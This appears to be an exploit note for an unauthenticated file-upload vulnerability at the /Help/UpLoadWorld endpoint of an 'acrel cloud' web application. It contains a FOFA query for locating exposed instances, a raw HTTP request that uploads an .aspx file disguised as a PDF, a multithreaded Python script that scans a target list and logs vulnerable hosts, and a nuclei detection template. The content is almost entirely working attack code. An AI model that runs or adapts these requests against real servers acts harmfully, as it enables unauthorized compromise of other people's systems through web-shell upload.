# fofa

```plain
body="myCss/phone.css"
```

# POC

```http
POST /Help/UpLoadWorld HTTP/1.1
Host: 
Content-Type: multipart/form-data; boundary=----6666
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0
Content-Length: 500

------6666
Content-Disposition: form-data; name="id"

WU_FILE_0
------6666
Content-Disposition: form-data; name="name"

6.aspx
------6666
Content-Disposition: form-data; name="type"

application/pdf
------6666
Content-Disposition: form-data; name="lastModifiedDate"

Sun Jan 05 2025 19:55:42
------6666
Content-Disposition: form-data; name="size"

637
------6666
Content-Disposition: form-data; name="file"; filename="6.aspx"
Content-Type: application/pdf

12321
------6666--
```

# exp

```python
import requests
import concurrent.futures

# proxy = {
#     'http': 'http://192.168.220.1:8080'
# }
def check_vulnerability(target):
    headers = {
        'Content-Type': 'multipart/form-data; boundary=----6666',
        'User-Agent': 'Mozilla/4.0(compatible; MSIE 8.0;Windows NT 6.1)'
    }

    data = '''------6666\r
Content-Disposition: form-data; name="id"\r
\r
WU_FILE_0\r
------6666\r
Content-Disposition: form-data; name="name"\r
\r
66.aspx\r
------6666\r
Content-Disposition: form-data; name="type"\r
\r
application/pdf\r
------6666\r
Content-Disposition: form-data; name="lastModifiedDate"\r
\r
Sun Jan 05 2025 19:55:42\r
------6666\r
Content-Disposition: form-data; name="size"\r
\r
637\r
------6666\r
Content-Disposition: form-data; name="file"; filename="66.aspx"\r
Content-Type: application/pdf\r
\r
12321\r
------6666'''
    try:
        res = requests.post(f"{target}/Help/UpLoadWorld", headers=headers, data=data, timeout=5, verify=False)
        if "66.aspx" in res.text:
            print(f"{target}漏洞存在")
            with open("attack.txt", "a") as f:
                f.write(f"{target}\n")
        else:
            print(f"{target} 漏洞不存在")
    except:
        print(f"{target} 访问错误")


if __name__ == "__main__":
    f = open("target.txt", 'r')
    targets = f.read().splitlines()

    # 使用线程池并发执行检查漏洞
    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
        executor.map(check_vulnerability, targets)
```

# nuclei

```yaml
id: acrel_cloud_uploadword_uploadfile

info:
  name: acrel cloud uploadword uploadfile
  author: zxf
  severity: high

http:
  - raw:
      - |
        POST /Help/UpLoadWorld HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----6666
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0
        Content-Length: 500

        ------6666
        Content-Disposition: form-data; name="id"

        WU_FILE_0
        ------6666
        Content-Disposition: form-data; name="name"

        66.aspx
        ------6666
        Content-Disposition: form-data; name="type"

        application/pdf
        ------6666
        Content-Disposition: form-data; name="lastModifiedDate"

        Sun Jan 05 2025 19:55:42
        ------6666
        Content-Disposition: form-data; name="size"

        637
        ------6666
        Content-Disposition: form-data; name="file"; filename="66.aspx"
        Content-Type: application/pdf

        12321
        ------6666--
        
    matchers:
      - type: dsl
        dsl:
          - status_code==200 && contains_all(body,"66.aspx")
```

![img](https://cdn.nlark.com/yuque/0/2025/png/40959960/1737442502545-556348a4-a020-4b4e-a5a1-d85047bebf2d.png)

